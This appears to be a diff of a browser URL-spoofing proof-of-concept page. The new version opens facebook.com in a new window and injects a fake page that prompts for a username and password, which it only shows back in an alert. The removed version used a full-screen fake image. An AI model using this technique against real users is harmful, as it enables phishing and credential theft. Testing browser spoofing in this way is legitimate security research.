@@ -1,69 +1,29 @@
 <!DOCTYPE html>
-<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
-  <head>
-    <meta charset="UTF-8" />
-    <title>Full Screen Image Trigger</title>
-    <style>
-      /* Optional: Prevent scroll when image is shown */
-      body.fullscreen-active {
-        overflow: hidden;
-      }
-
-      /* Buat div pengganti img supaya scroll */
-      #scroll-filler {
-        height: 10000px;
-      }
-    </style>
-  </head>
-
+<html>
   <body>
-    <!-- Gambar disembunyikan, akan muncul penuh saat di-trigger -->
-    <img
-      id="spoof"
-      style="display: none"
-      src="google.png"
-      alt="Fullscreen Image"
-    />
-
-    <!-- Elemen kosong untuk membuat halaman bisa discroll jauh ke bawah -->
-    <div id="scroll-filler"></div>
-
-    <!-- Paragraf target untuk selectAllChildren -->
-    <p id="paragraph1">
-      <!-- Trigger Translate Menu -->
-      A[= ?:TLv S9y
-      <!-- Trigger Translate Menu -->
-    </p>
+    <button onclick="spoof()">Click to spoof</button>
 
     <script>
-      function rfsSelectAll() {
-        document.execCommand("selectAll");
+      function spoof() {
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("https://www.facebook.com:80", "_blank");
 
-        // Tampilkan gambar dan atur ukurannya full screen
-        const img = document.getElementById("spoof");
-
-        img.style.display = "block";
-        img.style.position = "fixed";
-        img.style.top = "0";
-        img.style.left = "0";
-        img.style.width = "100vw";
-        img.style.height = "100vh";
-        img.style.objectFit = "cover";
-        img.style.zIndex = "9999";
-
-        // Tambahkan class agar body tidak scroll (opsional)
-        document.body.classList.add("fullscreen-active");
-      }
-
-      function selectAllChildren() {
-        const paragraph = document.getElementById("paragraph1");
-        if (paragraph) {
-          const selection = document.getSelection();
-          selection.removeAllRanges();
-          const range = document.createRange();
-          range.selectNodeContents(paragraph);
-          selection.addRange(range);
-        }
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
       }
     </script>
   </body>
